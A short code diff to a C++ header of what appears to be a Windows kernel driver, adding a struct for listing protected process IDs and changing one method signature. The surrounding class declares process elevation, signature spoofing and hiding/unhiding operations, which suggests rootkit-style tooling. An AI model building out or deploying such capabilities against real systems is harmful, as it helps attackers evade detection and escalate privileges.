@@ -18,6 +18,11 @@ constexpr SIZE_T PROCESS_VM_OPERATION = 0x8;
 #define VALID_PROCESS(Pid)(Pid > 0 && Pid != SYSTEM_PROCESS_PID)
 
 // Structs.
+struct OutputProtectedProcessesList {
+	ULONG PidsCount;
+	ULONG Processes[MAX_PIDS];
+};
+
 struct ProtectedProcessesList {
 	ULONG LastIndex;
 	ULONG PidsCount;
@@ -100,7 +105,7 @@ public:
 	bool FindProcess(ULONG pid);
 	bool AddProcess(ULONG pid);
 	bool RemoveProcess(ULONG pid);
-	void QueryProtectedProcesses(ProtectedProcessesList* list);
+	void QueryProtectedProcesses(OutputProtectedProcessesList* list);
 	NTSTATUS ElevateProcess(ULONG pid);
 	NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);
 	NTSTATUS UnhideProcess(ULONG pid);
